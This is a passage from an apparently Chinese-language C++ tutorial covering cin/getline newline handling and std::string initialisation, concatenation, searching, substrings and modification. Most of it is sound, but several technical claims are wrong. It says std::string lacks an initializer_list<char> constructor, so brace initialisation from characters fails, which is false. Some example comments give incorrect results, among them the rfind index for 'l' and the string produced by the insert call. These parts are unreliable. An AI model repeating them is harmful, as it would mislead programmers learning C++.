class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your full name: &quot;</span>;</span><br><span class="line">    <span class="comment">// 在 getline 之前使用 ws 跳过空白符</span></span><br><span class="line">    (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; <span class="built_in">std</span>::ws).getline(name, <span class="number">50</span>); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: [&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong> 混合输入数字和整行字符串时，务必记得在 <code>cin &gt;&gt; number;</code> 之后、调用 <code>getline()</code> 或 <code>get()</code> 之前，清除输入缓冲区中残留的换行符。使用 <code>cin.ignore()</code> 或 <code>(cin &gt;&gt; ws)</code> 是推荐的做法。</p><h2 id="4-3-string类简介"><a href="#4-3-string类简介" class="headerlink" title="4.3 string类简介"></a>4.3 string类简介</h2><p>虽然 C 风格字符串（字符数组）在 C++ 中仍然可用，但 C++ 标准库提供了一个更强大、更方便、更安全的替代品：<code>std::string</code> 类。</p><p><code>string</code> 类是标准库的一部分，它封装了字符序列的操作，提供了自动内存管理和丰富的成员函数来处理字符串。要使用 <code>string</code> 类，需要包含 <code>&lt;string&gt;</code> 头文件。</p><p><strong>基本概念:</strong></p><ul><li>  <strong>对象:</strong> <code>string</code> 类型的变量是**对象 (Object)**。对象是类的实例。</li><li>  <strong>自动内存管理:</strong> 与需要手动管理内存（确保数组足够大，处理空字符）的 C 风格字符串不同，<code>string</code> 对象会自动处理内存分配和释放。它可以根据需要动态增长或缩小。</li><li>  <strong>成员函数:</strong> <code>string</code> 类提供了许多内置的操作（成员函数），如获取长度、拼接、查找、替换等，使得字符串处理更加容易。</li></ul><p><strong>基本用法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 必须包含 string 头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明 string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1; <span class="comment">// 创建一个空字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 使用 C 风格字符串字面值初始化</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>; <span class="comment">// 使用 C 风格字符串字面值初始化 (构造函数语法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = s2; <span class="comment">// 使用另一个 string 对象初始化 (复制)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出空行</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s2: &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 World</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// string 对象可以像普通变量一样使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = s2 + <span class="string">&quot;, &quot;</span> + s3 + <span class="string">&quot;!&quot;</span>; <span class="comment">// 字符串拼接</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Message: &quot;</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Hello, World!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-1-C-11字符串初始化"><a href="#4-3-1-C-11字符串初始化" class="headerlink" title="4.3.1 C++11字符串初始化"></a>4.3.1 C++11字符串初始化</h3><p>C++11 引入的列表初始化（花括号初始化）也可以用于 <code>string</code> 对象，其行为类似于使用 C 风格字符串字面值进行初始化。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str1 &#123; <span class="string">&quot;Initialized with braces&quot;</span> &#125;; <span class="comment">// 使用 C 风格字符串字面值</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str2 = &#123; <span class="string">&quot;Also works with =&quot;</span> &#125;; </span><br><span class="line"><span class="comment">// std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 中通常不直接用字符列表初始化 string (会尝试调用匹配的构造函数)</span></span><br><span class="line"><span class="comment">// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // 同上</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 直接使用字符列表 <code>&#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125;</code> 来初始化 <code>std::string</code> 在 C++11/14 中通常不会按预期工作，因为它会尝试查找接受 <code>std::initializer_list&lt;char&gt;</code> 的构造函数，而标准 <code>std::string</code> 没有这样的构造函数。它通常会被解释为尝试调用接受 C 风格字符串 ( <code>const char*</code> ) 的构造函数，但这需要列表恰好能形成一个有效的 C 风格字符串（例如，包含 <code>\0</code>）。</p><p>最常用和清晰的初始化方式仍然是使用字符串字面值或另一个 <code>string</code> 对象。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting1 &#123; <span class="string">&quot;Good morning&quot;</span> &#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> greeting2 = &#123; <span class="string">&quot;Good afternoon&quot;</span> &#125;;</span><br><span class="line">    <span class="comment">// std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\0&#x27; &#125;; // 可能不按预期工作或编译错误</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Good morning</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; greeting2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 Good afternoon</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推荐的初始化方式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;       <span class="comment">// C 风格字面值</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;World&quot;</span>)</span></span>;      <span class="comment">// 构造函数语法</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = s1;          <span class="comment">// 复制构造</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;c&#x27;</span>)</span></span>;      <span class="comment">// 创建包含 10 个 &#x27;c&#x27; 的字符串 &quot;cccccccccc&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4: &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2-赋值、拼接和附加"><a href="#4-3-2-赋值、拼接和附加" class="headerlink" title="4.3.2 赋值、拼接和附加"></a>4.3.2 赋值、拼接和附加</h3><p><code>string</code> 类重载了常见的运算符，使得赋值、拼接和附加操作非常直观。</p><ul><li>  <strong>赋值 (<code>=</code>):</strong> 可以将一个 <code>string</code> 对象、一个 C 风格字符串字面值或一个 <code>char</code> 赋给一个 <code>string</code> 对象。</li><li>  <strong>拼接 (<code>+</code>):</strong> 可以使用 <code>+</code> 运算符将两个 <code>string</code> 对象、<code>string</code> 对象和 C 风格字符串字面值、或者 <code>string</code> 对象和 <code>char</code> 拼接起来，生成一个新的 <code>string</code> 对象。<strong>注意：不能直接拼接两个 C 风格字符串字面值，至少有一个操作数需要是 <code>string</code> 对象。</strong></li><li>  <strong>附加 (<code>+=</code>):</strong> 可以使用 <code>+=</code> 运算符将一个 <code>string</code> 对象、一个 C 风格字符串字面值或一个 <code>char</code> 附加到现有 <code>string</code> 对象的末尾（修改原字符串）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    s3 = s1; <span class="comment">// s3 变为 &quot;Hello&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&quot;Goodbye&quot;</span>; <span class="comment">// s3 变为 &quot;Goodbye&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after new assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s3 = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// s3 变为 &quot;X&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s3 after char assignment: &quot;</span> &lt;&lt; s3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接 (+) - 创建新字符串</span></span><br><span class="line">    s4 = s1 + <span class="string">&quot; &quot;</span> + s2 + <span class="string">&quot;!&quot;</span>; <span class="comment">// s4 变为 &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s4 (concatenated): &quot;</span> &lt;&lt; s4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s5 = s1 + <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s5 变为 &quot;Hello!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s5 (string + char): &quot;</span> &lt;&lt; s5 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误: 不能直接拼接两个 C 风格字符串字面值</span></span><br><span class="line">    <span class="comment">// std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // 编译错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确: 至少有一个是 string 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str1 = s1 + <span class="string">&quot; String2&quot;</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> ok_str2 = <span class="string">&quot;String1&quot;</span> + s2; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str1: &quot;</span> &lt;&lt; ok_str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ok_str2: &quot;</span> &lt;&lt; ok_str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 附加 (+=) - 修改原字符串</span></span><br><span class="line">    s1 += <span class="string">&quot; &quot;</span>; <span class="comment">// s1 变为 &quot;Hello &quot;</span></span><br><span class="line">    s1 += s2; <span class="comment">// s1 变为 &quot;Hello World&quot;</span></span><br><span class="line">    s1 += <span class="string">&#x27;!&#x27;</span>; <span class="comment">// s1 变为 &quot;Hello World!&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 after append: &quot;</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-string类的其他操作"><a href="#4-3-3-string类的其他操作" class="headerlink" title="4.3.3 string类的其他操作"></a>4.3.3 string类的其他操作</h3><p><code>string</code> 类提供了大量成员函数来执行各种字符串操作。以下是一些常用的操作：</p><ul><li><strong>获取长度/大小:</strong><ul><li>  <code>size()</code> 或 <code>length()</code>: 返回字符串中的字符数（两者功能相同）。</li></ul></li><li><strong>检查是否为空:</strong><ul><li>  <code>empty()</code>: 如果字符串为空，返回 <code>true</code>，否则返回 <code>false</code>。</li></ul></li><li><strong>访问字符:</strong><ul><li>  <code>[]</code> 运算符: 像数组一样通过索引访问字符（不进行边界检查）。</li><li>  <code>at()</code>: 通过索引访问字符（进行边界检查，如果越界会抛出 <code>std::out_of_range</code> 异常）。</li></ul></li><li><strong>查找:</strong><ul><li>  <code>find()</code>: 查找子字符串或字符首次出现的位置，返回索引；如果未找到，返回 <code>std::string::npos</code> (一个特殊的静态成员常量)。</li><li>  <code>rfind()</code>: 从后向前查找。</li><li>  <code>find_first_of()</code>, <code>find_last_of()</code>, <code>find_first_not_of()</code>, <code>find_last_not_of()</code>: 查找字符集中的任意字符或非任意字符。</li></ul></li><li><strong>子字符串:</strong><ul><li>  <code>substr(pos, count)</code>: 返回从位置 <code>pos</code> 开始，长度为 <code>count</code> 的子字符串。</li></ul></li><li><strong>比较:</strong><ul><li>  <code>compare()</code>: 比较字符串（字典序），返回负数、零或正数。</li><li>  重载的关系运算符 (<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>): 可以直接比较 <code>string</code> 对象。</li></ul></li><li><strong>修改:</strong><ul><li>  <code>insert()</code>: 在指定位置插入字符或字符串。</li><li>  <code>erase()</code>: 删除指定位置和数量的字符。</li><li>  <code>replace()</code>: 替换指定范围的字符。</li><li>  <code>clear()</code>: 清空字符串。</li><li>  <code>append()</code>: 等同于 <code>+=</code>。</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // 为了 std::out_of_range</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello C++ World!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 长度和空检查</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; text.length() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 16</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char (operator[]): &quot;</span> &lt;&lt; text[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 H</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fifth char (at()): &quot;</span> &lt;&lt; text.at(<span class="number">4</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 输出 o</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; text.at(20); // 会抛出 std::out_of_range 异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找</span></span><br><span class="line">    <span class="keyword">size_t</span> pos_cpp = text.find(<span class="string">&quot;C++&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pos_cpp != <span class="built_in">std</span>::<span class="built_in">string</span>::npos) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; found at index: &quot;</span> &lt;&lt; pos_cpp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;C++\&quot; not found.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> pos_l = text.find(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// 查找第一个 &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First &#x27;l&#x27; found at index: &quot;</span> &lt;&lt; pos_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pos_last_l = text.rfind(<span class="string">&#x27;l&#x27;</span>); <span class="comment">// 查找最后一个 &#x27;l&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last &#x27;l&#x27; found at index: &quot;</span> &lt;&lt; pos_last_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 12</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 子字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> sub = text.substr(<span class="number">6</span>, <span class="number">3</span>); <span class="comment">// 从索引 6 开始，取 3 个字符</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Substring (6, 3): \&quot;&quot;</span> &lt;&lt; sub &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;C++&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; s1 &lt;&lt; <span class="string">&quot;\&quot; comes before \&quot;&quot;</span> &lt;&lt; s2 &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp_result = s1.compare(s2); <span class="comment">// 返回负数，因为 &quot;apple&quot; &lt; &quot;apply&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Compare result: &quot;</span> &lt;&lt; cmp_result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改</span></span><br><span class="line">    text.insert(<span class="number">10</span>, <span class="string">&quot; beautiful&quot;</span>); <span class="comment">// 在索引 10 处插入</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After insert: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello C++ beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.erase(<span class="number">6</span>, <span class="number">4</span>); <span class="comment">// 从索引 6 开始，删除 4 个字符 (&quot;C++ &quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.replace(<span class="number">6</span>, <span class="number">9</span>, <span class="string">&quot;gorgeous&quot;</span>); <span class="comment">// 从索引 6 开始，替换 9 个字符 (&quot;beautiful&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After replace: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 &quot;Hello gorgeous World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.clear(); <span class="comment">// 清空字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After clear, is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-4-string类I-O"><a href="#4-3-4-string类I-O" class="headerlink" title="4.3.4 string类I/O"></a>4.3.4 string类I/O</h3><p>可以使用标准的输入输出流对象 <code>cin</code> 和 <code>cout</code> 来方便地读写 <code>string</code> 对象。</p><ul><li>  <strong>输出 (<code>cout &lt;&lt;</code>):</strong> <code>&lt;&lt;</code> 运算符被重载，可以直接将 <code>string</code> 对象输出到 <code>cout</code>。</li><li>  <strong>输入 (<code>cin &gt;&gt;</code>):</strong> <code>&gt;&gt;</code> 运算符被重载，可以从 